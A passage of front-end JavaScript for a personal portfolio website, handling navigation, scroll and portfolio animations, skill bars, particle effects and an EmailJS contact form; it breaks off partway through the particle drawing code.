// ===== MAIN JAVASCRIPT FILE =====

// Global variables
let lastScrollTop = 0;
const navbar = document.getElementById('navbar');
const hamburger = document.getElementById('nav-toggle');
const navMenu = document.getElementById('nav-menu');
const backToTopBtn = document.getElementById('back-to-top');
const contactForm = document.getElementById('contact-form');
const messageTextarea = document.getElementById('message');
const charCount = document.getElementById('char-count');

// ===== INITIALIZATION =====
document.addEventListener('DOMContentLoaded', function() {
    // Debug: Check if all sections exist
    console.log('Checking sections...');
    const sections = ['home', 'about', 'about-us', 'skills', 'testimonials', 'projects', 'design', 'contact'];
    sections.forEach(sectionId => {
        const element = document.getElementById(sectionId);
        console.log(`Section ${sectionId}:`, element ? 'Found' : 'Missing');
    });
    
    // Check if Font Awesome is loaded
    const checkFontAwesome = () => {
        const testIcon = document.createElement('i');
        testIcon.className = 'fas fa-home';
        testIcon.style.display = 'none';
        document.body.appendChild(testIcon);
        const computedStyle = window.getComputedStyle(testIcon, '::before');
        const isLoaded = computedStyle.content !== 'none' && computedStyle.content !== '';
        document.body.removeChild(testIcon);
        
        if (!isLoaded) {
            console.warn('Font Awesome not loaded, adding fallback');
            loadFontAwesomeFallback();
        } else {
            console.log('Font Awesome loaded successfully');
        }
        
        // Force refresh of icons
        refreshIcons();
    };
    
    // Load Font Awesome fallback
    const loadFontAwesomeFallback = () => {
        const fallbackLink = document.createElement('link');
        fallbackLink.rel = 'stylesheet';
        fallbackLink.href = 'https://use.fontawesome.com/releases/v6.0.0/css/all.css';
        document.head.appendChild(fallbackLink);
        
        fallbackLink.onload = () => {
            console.log('Font Awesome fallback loaded');
            setTimeout(refreshIcons, 100);
        };
    };
    
    // Refresh icons visibility
    const refreshIcons = () => {
        const allIcons = document.querySelectorAll('i[class*="fa"]');
        allIcons.forEach(icon => {
            icon.style.display = 'none';
            icon.offsetHeight; // Trigger reflow
            icon.style.display = '';
        });
        console.log(`Refreshed ${allIcons.length} Font Awesome icons`);
    };
    
    // Check Font Awesome after delay
    setTimeout(checkFontAwesome, 500);
    
    initializeAnimations();
    initializeNavigation();
    initializeScrollEffects();
    initializeProjectFilters();
    initializePortfolioAnimations();
    // REMOVED: initializePortfolioLazyLoading() - no more loading interference
    initializeProjectInteractions();
    initializeContactForm();
    initializeSkillBars();
    observeElements();
    initializeBackgroundEffects();
    initializeParticleNetwork();
    initializeMatrixRain();
    initializeNeuralNetwork();
    initializeResponsiveFeatures(); // Add responsive features
    initializeBlogFunctionality(); // Add blog functionality
    initializeMobileTimeline(); // Add mobile timeline functionality
    // Removed mobile portfolio function that adds "Tap to scroll" text
    
    // Debug logging for small screens
    if (window.innerWidth <= 480 || window.innerHeight <= 700) {
        console.log('🔍 Small screen detected:', window.innerWidth + 'x' + window.innerHeight);
        console.log('🔍 Touch support:', 'ontouchstart' in window);
        console.log('🔍 Max touch points:', navigator.maxTouchPoints);
        console.log('🔍 User agent:', navigator.userAgent);
    }
    
    // Re-initialize portfolio on resize for responsive behavior
    let resizeTimeout;
    window.addEventListener('resize', () => {
        clearTimeout(resizeTimeout);
        resizeTimeout = setTimeout(() => {
            console.log('Window resized, re-initializing portfolio');
            initializePortfolioAnimations();
        }, 250);
    });
});

// ===== NAVIGATION FUNCTIONALITY =====
function initializeNavigation() {
    try {
        // Simple mobile menu - using the cleaner implementation
        console.log('Navigation initialized - using simple mobile menu');
        
        // Close mobile menu when clicking on nav links
        document.querySelectorAll('.nav-link').forEach(link => {
            link.addEventListener('click', () => {
                const navToggle = document.getElementById('nav-toggle');
                const navMenu = document.getElementById('nav-menu');
                if (navToggle && navMenu) {
                    navMenu.classList.remove('active');
                    navToggle.classList.remove('active');
                    document.body.classList.remove('nav-open');
                }
            });
        });
        
        // Close mobile menu when clicking outside
        document.addEventListener('click', function(e) {
            if (navMenu && navMenu.classList.contains('active')) {
                if (!navMenu.contains(e.target) && !hamburger.contains(e.target)) {
                    closeMobileMenu();
                }
            }
        });
        
        // Smooth scrolling for navigation links
        document.querySelectorAll('a[href^="#"]').forEach(anchor => {
            anchor.addEventListener('click', function (e) {
                e.preventDefault();
                const target = document.querySelector(this.getAttribute('href'));
                if (target) {
                    const headerOffset = 80;
                    const elementPosition = target.getBoundingClientRect().top;
                    const offsetPosition = elementPosition + window.pageYOffset - headerOffset;
                    
                    window.scrollTo({
                    top: offsetPosition,
                    behavior: 'smooth'
                });
            }
        });
    });
    
    // Update active navigation link based on scroll position
    window.addEventListener('scroll', updateActiveNavLink);
    } catch (error) {
        console.error('Error initializing navigation:', error);
    }
}

function updateActiveNavLink() {
    const sections = document.querySelectorAll('section[id]');
    const scrollPos = window.scrollY + 100;
    
    sections.forEach(section => {
        const sectionTop = section.getBoundingClientRect().top + window.pageYOffset;
        const sectionHeight = section.offsetHeight;
        const sectionId = section.getAttribute('id');
        const navLink = document.querySelector(`.nav-link[href="#${sectionId}"]`);
        
        if (scrollPos >= sectionTop && scrollPos < sectionTop + sectionHeight) {
            document.querySelectorAll('.nav-link').forEach(link => {
                link.classList.remove('active');
            });
            if (navLink) {
                navLink.classList.add('active');
            }
        }
    });
}

// ===== SCROLL EFFECTS =====
function initializeScrollEffects() {
    window.addEventListener('scroll', handleScroll);
}

function handleScroll() {
    const scrollTop = window.pageYOffset || document.documentElement.scrollTop;
    
    // Improved navbar scroll effect
    if (scrollTop > lastScrollTop && scrollTop > 80) {
        // Scrolling down - hide navbar
        navbar.style.transform = 'translateY(-100%)';
        navbar.classList.add('hidden');
    } else if (scrollTop < lastScrollTop || scrollTop <= 80) {
        // Scrolling up or near top - show navbar
        navbar.style.transform = 'translateY(0)';
        navbar.classList.remove('hidden');
    }
    
    // Add scrolled class to navbar for background change
    if (scrollTop > 50) {
        navbar.classList.add('scrolled');
    } else {
        navbar.classList.remove('scrolled');
    }
    
    // Back to top button visibility
    if (scrollTop > 300) {
        backToTopBtn.classList.add('visible');
    } else {
        backToTopBtn.classList.remove('visible');
    }
    
    lastScrollTop = scrollTop;
}

// Back to top functionality
backToTopBtn.addEventListener('click', function() {
    window.scrollTo({
        top: 0,
        behavior: 'smooth'
    });
});

// ===== PROJECT FILTERING =====
function initializeProjectFilters() {
    const filterBtns = document.querySelectorAll('.filter-btn');
    const projectCards = document.querySelectorAll('.project-card');
    
    filterBtns.forEach(btn => {
        btn.addEventListener('click', function() {
            const filter = this.getAttribute('data-filter');
            
            // Update active filter button
            filterBtns.forEach(b => b.classList.remove('active'));
            this.classList.add('active');
            
            // Filter projects
            projectCards.forEach(card => {
                const category = card.getAttribute('data-category');
                
                if (filter === 'all' || category === filter) {
                    card.style.display = 'block';
                    setTimeout(() => {
                        card.style.opacity = '1';
                        card.style.transform = 'translateY(0)';
                    }, 100);
                } else {
                    card.style.opacity = '0';
                    card.style.transform = 'translateY(20px)';
                    setTimeout(() => {
                        card.style.display = 'none';
                    }, 300);
                }
            });
        });
    });
}

// ===== ENHANCED PORTFOLIO ANIMATIONS =====
function initializePortfolioAnimations() {
    const portfolioItems = document.querySelectorAll('.portfolio-item');
    console.log(`Found ${portfolioItems.length} portfolio items for animation initialization`);
    
    if (portfolioItems.length === 0) {
        console.warn('No portfolio items found! Checking for alternative selectors...');
        const alternativeSelectors = ['.project-card', '.gallery-item', '.portfolio-card'];
        alternativeSelectors.forEach(selector => {
            const items = document.querySelectorAll(selector);
            console.log(`Found ${items.length} items with selector: ${selector}`);
        });
        return;
    }
    
    // Initialize intersection observer for staggered animations
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };
    
    const portfolioObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('animate-in');
            }
        });
    }, observerOptions);
    
    portfolioItems.forEach((item, index) => {
        // Observe for animations
        portfolioObserver.observe(item);
        
        const image = item.querySelector('.portfolio-image');
        
        // Remove any loading states immediately - no loading interference
        if (image) {
            image.classList.remove('blur-load', 'loading');
            image.style.filter = 'none';
        }
        
        // Shared variables for this portfolio item
        let itemIsScrolling = false;
        let touchStartTime;
        
        // Universal device support - works on ALL devices regardless of size
        const hasTouch = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
        const isSmallScreen = window.innerWidth <= 480 || window.innerHeight <= 700;
        if (image) {
            image.classList.remove('blur-load');
            image.classList.add('loaded');
            
            // Hide any loading indicators
            const loadingIndicator = item.querySelector('.loading-indicator');
            if (loadingIndicator) {
                loadingIndicator.style.display = 'none';
            }
        }
        
        // Enhanced hover interactions - INSTANT RESPONSE
        if (window.innerWidth >= 1024) {
            // Desktop: hover to start auto-scroll IMMEDIATELY
            item.addEventListener('mouseenter', () => {
                if (image) {
                    // INSTANT animation start - absolutely no delays
                    image.style.animation = 'portfolioAutoScroll 15s linear infinite';
                    
                    // Add subtle glow effect
                    item.style.boxShadow = `
                        0 25px 50px rgba(102, 126, 234, 0.25),
                        0 0 0 1px rgba(102, 126, 234, 0.1),
                        inset 0 1px 0 rgba(255, 255, 255, 0.1)
                    `;
                }
            });
            
            item.addEventListener('mouseleave', () => {
                if (image) {
                    // Stop animation instantly
                    image.style.animation = 'none';
                    image.style.objectPosition = 'top';
                    // Reset glow
                    item.style.boxShadow = '';
                }
            });
        }
        
        // Universal functionality for all devices
        const portfolioImage = item.querySelector('.portfolio-image');
        
        if (portfolioImage) {
            // SIMPLIFIED - Just auto-scroll on click, no overlays or complications
            
            function simpleAutoScroll(e) {
                // Don't interfere with overlay buttons
                if (e.target.closest('.overlay-btn') || e.target.closest('.portfolio-overlay')) {
                    return;
                }
                
                e.preventDefault();
                e.stopPropagation();
                
                console.log('📱 Starting simple auto-scroll');
                
                // Start auto-scrolling immediately - no toggle, no overlays
                portfolioImage.style.animation = 'none';
                portfolioImage.style.objectPosition = 'center top';
                
                // Force reflow
                portfolioImage.offsetHeight;
                
                // Start the scroll animation
                portfolioImage.style.animation = 'portfolioAutoScroll 8s linear infinite';
                portfolioImage.style.willChange = 'object-position';
                
                // Auto-stop after 8 seconds
                setTimeout(() => {
                    portfolioImage.style.animation = 'none';
                    portfolioImage.style.objectPosition = 'center top';
                    portfolioImage.style.willChange = 'auto';
                    console.log('📱 Auto-scroll completed');
                }, 8000);
            }
            
            function handleTouchStart(e) {
                if (e.target.closest('.overlay-btn') || e.target.closest('.portfolio-overlay')) {
                    return;
                }
                touchStartTime = Date.now();
                
                // Add immediate visual feedback for small screens
                if (isSmallScreen) {
                    item.style.backgroundColor = 'rgba(102, 126, 234, 0.1)';
                }
            }
            
            function handleTouchEnd(e) {
                if (e.target.closest('.overlay-btn') || e.target.closest('.portfolio-overlay')) {
                    return;
                }
                
                // Remove visual feedback
                if (isSmallScreen) {
                    setTimeout(() => {
                        if (!isScrolling) {
                            item.style.backgroundColor = '';
                        }
                    }, 100);
                }
                
                const touchDuration = Date.now() - touchStartTime;
                // More lenient tap duration for small screens
                const maxTapDuration = isSmallScreen ? 700 : 500;
                
                if (touchDuration < maxTapDuration) {
                    handleUniversalInteraction(e);
                }
            }
            
            // Enhanced event binding for small screens
            if (hasTouch) {
                // Touch-enabled devices with enhanced small screen support
                portfolioImage.addEventListener('touchstart', handleTouchStart, { passive: false });
                portfolioImage.addEventListener('touchend', handleTouchEnd, { passive: false });
                item.addEventListener('touchstart', handleTouchStart, { passive: false });
                item.addEventListener('touchend', handleTouchEnd, { passive: false });
                
                // Additional events for small screens
                if (isSmallScreen) {
                    portfolioImage.addEventListener('touchmove', function(e) {
                        // Prevent scrolling during touch
                        e.preventDefault();
                    }, { passive: false });
                }
            }
            
            // SIMPLIFIED - Just click to auto-scroll, no complications
            portfolioImage.addEventListener('click', simpleAutoScroll, { passive: false });
            item.addEventListener('click', simpleAutoScroll, { passive: false });
            
            // Touch events for mobile
            portfolioImage.addEventListener('touchend', simpleAutoScroll, { passive: false });
            item.addEventListener('touchend', simpleAutoScroll, { passive: false });
            
            // Also keep hover for desktop convenience (but don't auto-start, just enable interaction)
            if (!hasTouch && !isSmallScreen) {
                item.addEventListener('mouseenter', () => {
                    // Add hover visual feedback for desktop
                    item.style.transform = 'translateY(-5px)';
                    item.style.boxShadow = '0 15px 30px rgba(0, 0, 0, 0.3)';
                });
                
                item.addEventListener('mouseleave', () => {
                    // Remove hover effects but don't stop scrolling
                    if (!isScrolling) {
                        item.style.transform = 'translateY(0)';
                        item.style.boxShadow = '0 10px 20px rgba(0, 0, 0, 0.2)';
                    }
                });
            }
            
            function handleUniversalInteraction(e) {
                // Don't interfere with overlay buttons
                if (e.target.closest('.overlay-btn') || e.target.closest('.portfolio-overlay')) {
                    return;
                }
                
                e.preventDefault();
                e.stopPropagation();
                
                console.log('Portfolio interaction detected on any device');
                
                // Stop all other scrolling animations
                document.querySelectorAll('.portfolio-item').forEach(otherItem => {
                    otherItem.classList.remove('scrolling');
                    const img = otherItem.querySelector('.portfolio-image');
                    if (img) {
                        img.style.animation = 'none';
                        img.style.objectPosition = 'top';
                    }
                });
                
                // Toggle scrolling for this item
                if (isScrolling) {
                    // Stop scrolling
                    item.classList.remove('scrolling');
                    portfolioImage.style.animation = 'none';
                    portfolioImage.style.objectPosition = 'top';
                    isScrolling = false;
                    console.log('Portfolio scrolling stopped');
                } else {
                    // Start scrolling
                    item.classList.add('scrolling');
                    portfolioImage.style.animation = 'portfolioAutoScroll 15s linear infinite';
                    isScrolling = true;
                    console.log('Portfolio scrolling started');
                    
                    // Auto-stop after 15 seconds
                    setTimeout(() => {
                        item.classList.remove('scrolling');
                        portfolioImage.style.animation = 'none';
                        portfolioImage.style.objectPosition = 'top';
                        isScrolling = false;
                        console.log('Portfolio scrolling auto-stopped');
                    }, 15000);
                }
            }
            
            function handleTouchStart(e) {
                if (e.target.closest('.overlay-btn') || e.target.closest('.portfolio-overlay')) {
                    return;
                }
                touchStartTime = Date.now();
            }
            
            function handleTouchEnd(e) {
                if (e.target.closest('.overlay-btn') || e.target.closest('.portfolio-overlay')) {
                    return;
                }
                
                const touchDuration = Date.now() - touchStartTime;
                // Only trigger if it's a tap (not a long press or scroll)
                if (touchDuration < 500) {
                    handleUniversalInteraction(e);
                }
            }
            
            // Add event listeners for ALL devices
            if (hasTouch) {
                // Touch-enabled devices (phones, tablets, touch laptops)
                portfolioImage.addEventListener('touchstart', handleTouchStart, { passive: false });
                portfolioImage.addEventListener('touchend', handleTouchEnd, { passive: false });
                item.addEventListener('touchstart', handleTouchStart, { passive: false });
                item.addEventListener('touchend', handleTouchEnd, { passive: false });
            }
            
            // Click events for ALL devices (mouse and touch)
            portfolioImage.addEventListener('click', handleUniversalInteraction, { passive: false });
            item.addEventListener('click', handleUniversalInteraction, { passive: false });
            
            // Also keep hover for desktop convenience (but don't auto-start, just enable interaction)
            if (!hasTouch) {
                item.addEventListener('mouseenter', () => {
                    // Add hover visual feedback for desktop
                    item.style.transform = 'translateY(-5px)';
                    item.style.boxShadow = '0 15px 30px rgba(0, 0, 0, 0.3)';
                });
                
                item.addEventListener('mouseleave', () => {
                    // Remove hover effects but don't stop scrolling
                    if (!isScrolling) {
                        item.style.transform = 'translateY(0)';
                        item.style.boxShadow = '0 10px 20px rgba(0, 0, 0, 0.2)';
                    }
                });
            }
        
        // Add sophisticated micro-interactions
        const titleElement = item.querySelector('.portfolio-info h3');
        const categoryElement = item.querySelector('.portfolio-category');
        
        item.addEventListener('mouseenter', () => {
            if (titleElement) {
                titleElement.style.transform = 'translateY(-2px)';
                titleElement.style.color = '#667eea';
            }
            if (categoryElement) {
                categoryElement.style.transform = 'translateY(-1px)';
                categoryElement.style.letterSpacing = '1.5px';
            }
        });
        
        item.addEventListener('mouseleave', () => {
            if (titleElement) {
                titleElement.style.transform = 'translateY(0)';
                titleElement.style.color = '#fff';
            }
            if (categoryElement) {
                categoryElement.style.transform = 'translateY(0)';
                categoryElement.style.letterSpacing = '1px';
            }
        });
    });
    
    // Handle window resize to switch between desktop/mobile behavior
    window.addEventListener('resize', debounce(() => {
        console.log('Window resized, re-initializing portfolio animations');
        // Clear existing animations first
        portfolioItems.forEach(item => {
            const image = item.querySelector('.portfolio-image');
            if (image) {
                image.style.animation = 'none';
                image.style.objectPosition = 'top';
            }
            item.classList.remove('scrolling');
        });
        
        // Re-initialize with new screen size behavior
        setTimeout(() => {
            initializePortfolioAnimations();
        }, 100);
    }, 250));
}

// Utility function for debouncing
function debounce(func, wait) {
    let timeout;
    return function executedFunction(...args) {
        const later = () => {
            clearTimeout(timeout);
            func(...args);
        };
        clearTimeout(timeout);
        timeout = setTimeout(later, wait);
    };
}

// ===== PORTFOLIO PROJECT INTERACTIONS =====
function initializeProjectInteractions() {
    const overlayBtns = document.querySelectorAll('.overlay-btn');
    
    overlayBtns.forEach(btn => {
        // Add ripple effect to overlay buttons
        btn.addEventListener('click', function(e) {
            // Create ripple effect
            const ripple = document.createElement('span');
            const rect = this.getBoundingClientRect();
            const size = Math.max(rect.width, rect.height);
            const x = e.clientX - rect.left - size / 2;
            const y = e.clientY - rect.top - size / 2;
            
            ripple.style.cssText = `
                position: absolute;
                width: ${size}px;
                height: ${size}px;
                left: ${x}px;
                top: ${y}px;
                background: rgba(255, 255, 255, 0.4);
                border-radius: 50%;
                transform: scale(0);
                animation: portfolioRipple 0.6s ease-out;
                pointer-events: none;
            `;
            
            this.style.position = 'relative';
            this.style.overflow = 'hidden';
            this.appendChild(ripple);
            
            setTimeout(() => {
                if (this.contains(ripple)) {
                    this.removeChild(ripple);
                }
            }, 600);
        });
    });
}

// Add portfolio ripple animation CSS
const portfolioRippleStyle = document.createElement('style');
portfolioRippleStyle.textContent = `
    @keyframes portfolioRipple {
        to {
            transform: scale(2);
            opacity: 0;
        }
    }
    
    .scroll-feedback {
        animation: feedbackPulse 0.3s ease-out;
    }
    
    @keyframes feedbackPulse {
        0% {
            transform: translate(-50%, -50%) scale(0.8);
        }
        100% {
            transform: translate(-50%, -50%) scale(1);
        }
    }
`;
document.head.appendChild(portfolioRippleStyle);

// Mobile portfolio functionality removed - using simple click-to-scroll instead

// ===== OLD PORTFOLIO FUNCTIONS (KEEP FOR COMPATIBILITY) =====
function initializePortfolioAnimationsOld() {
    const autoScrollImages = document.querySelectorAll('.auto-scroll-image');
    const mockupFrames = document.querySelectorAll('.mockup-frame');
    
    // Initialize auto-scroll animations
    autoScrollImages.forEach((img, index) => {
        // Add random delay to make animations more natural
        const delay = index * 0.5; // 0.5s delay between each image
        img.style.animationDelay = `${delay}s`;
        
        // Add intersection observer for performance
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    entry.target.style.animationPlayState = 'running';
                } else {
                    entry.target.style.animationPlayState = 'paused';
                }
            });
        }, {
            threshold: 0.1
        });
        
        observer.observe(img);
    });
    
    // Enhanced hover effects for mockup frames
    mockupFrames.forEach(frame => {
        const img = frame.querySelector('.auto-scroll-image');
        
        frame.addEventListener('mouseenter', () => {
            if (img) {
                img.style.animationPlayState = 'paused';
                frame.style.transform = 'scale(1.02)';
                frame.style.transition = 'transform 0.3s ease';
            }
        });
        
        frame.addEventListener('mouseleave', () => {
            if (img) {
                img.style.animationPlayState = 'running';
                frame.style.transform = 'scale(1)';
            }
        });
        
        // Add click to pause/resume functionality
        frame.addEventListener('click', () => {
            if (img) {
                const isRunning = img.style.animationPlayState !== 'paused';
                img.style.animationPlayState = isRunning ? 'paused' : 'running';
                
                // Visual feedback
                const overlay = document.createElement('div');
                overlay.className = 'animation-toggle-feedback';
                overlay.innerHTML = isRunning ? '⏸️' : '▶️';
                overlay.style.cssText = `
                    position: absolute;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    background: rgba(0, 0, 0, 0.8);
                    color: white;
                    padding: 10px;
                    border-radius: 50%;
                    font-size: 1.5rem;
                    z-index: 100;
                    opacity: 0;
                    transition: opacity 0.3s ease;
                `;
                
                frame.style.position = 'relative';
                frame.appendChild(overlay);
                
                // Animate feedback
                setTimeout(() => overlay.style.opacity = '1', 10);
                setTimeout(() => {
                    overlay.style.opacity = '0';
                    setTimeout(() => {
                        if (frame.contains(overlay)) {
                            frame.removeChild(overlay);
                        }
                    }, 300);
                }, 1000);
            }
        });
    });
}

// ===== CONTACT FORM =====
function initializeContactForm() {
    // Initialize EmailJS with better error handling
    try {
        if (typeof emailjs !== 'undefined') {
            emailjs.init("SolXo37Kvy-QX5d7U");
            console.log('EmailJS initialized successfully');
        } else {
            console.error('EmailJS not loaded');
            showNotification('Email service not available. Please refresh the page.', 'error');
        }
    } catch (error) {
        console.error('EmailJS initialization error:', error);
    }
    
    // Character counter for message textarea
    if (messageTextarea && charCount) {
        messageTextarea.addEventListener('input', function() {
            const currentLength = this.value.length;
            const maxLength = 500;
            charCount.textContent = currentLength;
            
            if (currentLength > maxLength) {
                charCount.style.color = '#ff6b6b';
                this.value = this.value.substring(0, maxLength);
                charCount.textContent = maxLength;
            } else {
                charCount.style.color = '#a0a0a0';
            }
        });
    }
    
    // Form submission
    if (contactForm) {
        contactForm.addEventListener('submit', function(e) {
            e.preventDefault();
            handleFormSubmission();
        });
    }
}

function handleFormSubmission() {
    const name = document.getElementById('name').value;
    const email = document.getElementById('email').value;
    const subject = document.getElementById('subject').value;
    const message = document.getElementById('message').value;
    
    // Basic validation
    if (!name || !email || !subject || !message) {
        showNotification('Please fill in all fields.', 'error');
        return;
    }
    
    if (!isValidEmail(email)) {
        showNotification('Please enter a valid email address.', 'error');
        return;
    }
    
    // Check if EmailJS is available
    if (typeof emailjs === 'undefined') {
        showNotification('❌ Email service not available. Please refresh the page and try again.', 'error');
        return;
    }
    
    // Show loading state
    const submitBtn = contactForm.querySelector('button[type="submit"]');
    const originalBtnText = submitBtn.innerHTML;
    submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Sending...';
    submitBtn.disabled = true;
    
    // Send email using EmailJS with updated template ID
    const templateParams = {
        from_name: name,
        from_email: email,
        subject: subject,
        message: message,
        to_name: 'Nehemiah',
        reply_to: email
    };
    
    console.log('Sending email with params:', templateParams);
    
    emailjs.send('service_70qxuz3', 'template_emryv6d', templateParams)
        .then(function(response) {
            console.log('SUCCESS!', response.status, response.text);
            
            // Track successful form submission
            if (typeof trackFormSubmission === 'function') {
                trackFormSubmission('contact_form');
            }
            
            showNotification('✅ Message sent successfully! I\'ll get back to you within 24 hours.', 'success');
            contactForm.reset();
            if (charCount) charCount.textContent = '0';
        })
        .catch(function(error) {
            console.error('EmailJS Error:', error);
            let errorMessage = '❌ Failed to send message. ';
            
            if (error.status === 422) {
                errorMessage += 'Please check that all fields are filled correctly.';
            } else if (error.status === 400) {
                errorMessage += 'Invalid email configuration. Please contact me directly.';
            } else if (error.status === 403) {
                errorMessage += 'Email service temporarily unavailable.';
            } else {
                errorMessage += 'Please try again or email me directly at nehemiahandrew1@gmail.com';
            }
            
            showNotification(errorMessage, 'error');
        })
        .finally(() => {
            // Restore button state
            submitBtn.innerHTML = originalBtnText;
            submitBtn.disabled = false;
        });
}

function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

function showNotification(message, type) {
    // Create notification element
    const notification = document.createElement('div');
    notification.className = `notification ${type}`;
    notification.textContent = message;
    
    // Style the notification
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 15px 20px;
        border-radius: 10px;
        color: white;
        font-weight: 600;
        z-index: 10000;
        transform: translateX(400px);
        transition: transform 0.3s ease;
        ${type === 'success' ? 'background: linear-gradient(135deg, #4CAF50, #45a049);' : 'background: linear-gradient(135deg, #f44336, #da190b);'}
    `;
    
    document.body.appendChild(notification);
    
    // Animate in
    setTimeout(() => {
        notification.style.transform = 'translateX(0)';
    }, 100);
    
    // Remove after 5 seconds
    setTimeout(() => {
        notification.style.transform = 'translateX(400px)';
        setTimeout(() => {
            document.body.removeChild(notification);
        }, 300);
    }, 5000);
}

// ===== SKILL BARS ANIMATION =====
function initializeSkillBars() {
    const skillBars = document.querySelectorAll('.skill-progress');
    const skillBubbles = document.querySelectorAll('.skill-bubble');
    
    const animateSkillBars = () => {
        skillBars.forEach(bar => {
            const width = bar.getAttribute('data-width');
            bar.style.width = width;
        });
    };
    
    const animateSkillBubbles = () => {
        skillBubbles.forEach((bubble, index) => {
            setTimeout(() => {
                bubble.style.opacity = '1';
                bubble.style.transform = 'scale(1)';
            }, index * 200);
        });
    };
    
    // Initialize bubbles as hidden
    skillBubbles.forEach(bubble => {
        bubble.style.opacity = '0';
        bubble.style.transform = 'scale(0)';
        bubble.style.transition = 'all 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55)';
    });
    
    // Trigger animation when skills section comes into view
    const skillsSection = document.getElementById('skills');
    if (skillsSection) {
        const observer = new IntersectionObserver((entries) => {
            entries.forEach(entry => {
                if (entry.isIntersecting) {
                    setTimeout(animateSkillBubbles, 300);
                    setTimeout(animateSkillBars, 800);
                    observer.unobserve(entry.target);
                }
            });
        }, { threshold: 0.5 });
        
        observer.observe(skillsSection);
    }
}

// ===== INTERSECTION OBSERVER FOR ANIMATIONS =====
function observeElements() {
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -100px 0px'
    };
    
    const observer = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('animate');
            }
        });
    }, observerOptions);
    
    // Observe elements for animation
    const animatedElements = document.querySelectorAll(`
        .about-content,
        .skill-item,
        .timeline-item,
        .testimonial-card,
        .project-card,
        .gallery-item,
        .contact-content
    `);
    
    animatedElements.forEach(el => {
        observer.observe(el);
    });
}

// ===== ANIMATIONS =====
function initializeAnimations() {
    // Add CSS for animated elements
    const style = document.createElement('style');
    style.textContent = `
        .about-content,
        .skill-item,
        .timeline-item,
        .testimonial-card,
        .project-card,
        .gallery-item,
        .contact-content {
            opacity: 0;
            transform: translateY(30px);
            transition: all 0.6s ease;
        }
        
        .about-content.animate,
        .skill-item.animate,
        .timeline-item.animate,
        .testimonial-card.animate,
        .project-card.animate,
        .gallery-item.animate,
        .contact-content.animate {
            opacity: 1;
            transform: translateY(0);
        }
        
        .project-card {
            transition-delay: calc(var(--animation-order, 0) * 0.1s);
        }
        
        .gallery-item {
            transition-delay: calc(var(--animation-order, 0) * 0.1s);
        }
        
        .testimonial-card {
            transition-delay: calc(var(--animation-order, 0) * 0.15s);
        }
    `;
    document.head.appendChild(style);
    
    // Set animation delays for grid items
    document.querySelectorAll('.project-card').forEach((card, index) => {
        card.style.setProperty('--animation-order', index);
    });
    
    document.querySelectorAll('.gallery-item').forEach((item, index) => {
        item.style.setProperty('--animation-order', index);
    });
    
    document.querySelectorAll('.testimonial-card').forEach((card, index) => {
        card.style.setProperty('--animation-order', index);
    });
}

// ===== TYPING EFFECT FOR HERO TITLE =====
function initializeTypingEffect() {
    const heroTitle = document.querySelector('.hero-title');
    const text = 'Hi, my name is\nNehemiah 🚀';
    
    if (heroTitle) {
        heroTitle.innerHTML = '';
        let i = 0;
        
        function typeWriter() {
            if (i < text.length) {
                if (text.charAt(i) === '\n') {
                    heroTitle.innerHTML += '<br>';
                } else {
                    heroTitle.innerHTML += text.charAt(i);
                }
                i++;
                setTimeout(typeWriter, 100);
            }
        }
        
        setTimeout(typeWriter, 1000);
    }
}

// ===== THEME TOGGLE (Optional) =====
function initializeThemeToggle() {
    const themeToggle = document.getElementById('theme-toggle');
    
    if (themeToggle) {
        themeToggle.addEventListener('click', function() {
            document.body.classList.toggle('light-theme');
            
            // Save theme preference
            const isLight = document.body.classList.contains('light-theme');
            localStorage.setItem('theme', isLight ? 'light' : 'dark');
        });
        
        // Load saved theme
        const savedTheme = localStorage.getItem('theme');
        if (savedTheme === 'light') {
            document.body.classList.add('light-theme');
        }
    }
}

// ===== PARTICLES BACKGROUND (Optional Enhancement) =====
function initializeParticles() {
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    
    canvas.id = 'particles-canvas';
    canvas.style.cssText = `
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        pointer-events: none;
        z-index: -1;
        opacity: 0.1;
    `;
    
    document.body.appendChild(canvas);
    
    let particles = [];
    let animationId;
    
    function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    
    function createParticle() {
        return {
            x: Math.random() * canvas.width,
            y: Math.random() * canvas.height,
            size: Math.random() * 3 + 1,
            speedX: Math.random() * 2 - 1,
            speedY: Math.random() * 2 - 1,
            opacity: Math.random() * 0.5 + 0.2
        };
    }
    
    function initParticles() {
        particles = [];
        const particleCount = Math.floor((canvas.width * canvas.height) / 10000);
        
        for (let i = 0; i < particleCount; i++) {
            particles.push(createParticle());
        }
    }
    
    function updateParticles() {
        particles.forEach(particle => {
            particle.x += particle.speedX;
            particle.y += particle.speedY;
            
            if (particle.x < 0 || particle.x > canvas.width) {
                particle.speedX *= -1;
            }
            if (particle.y < 0 || particle.y > canvas.height) {
                particle.speedY *= -1;
            }
        });
    }
    
    function drawParticles() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        
        particles.forEach(particle => {
            ctx.beginPath();
            ctx.arc(particle.x, particle.y, particle.size, 0, Math.PI * 2);
            ctx.fillStyle = `rgba(102, 126, 234, ${particle.opacity})`;
            ctx.fill();
        });
        
        // Draw connections
        particles.forEach((particle, i) => {
            particles.slice(i + 1).forEach(otherParticle => {
                const distance = Math.sqrt(
                    Math.pow(particle.x - otherParticle.x, 2) +
                    Math.pow(particle.y - otherParticle.y, 2)
                );
                
                if (distance < 100) {
                    ctx.beginPath();
                    ctx.moveTo(particle.x, particle.y);
                    ctx.lineTo(otherParticle.x, otherParticle.y);
                    ctx.strokeStyle = `rgba(102, 126, 234, ${0.2 * (1 - distance / 100)})`;
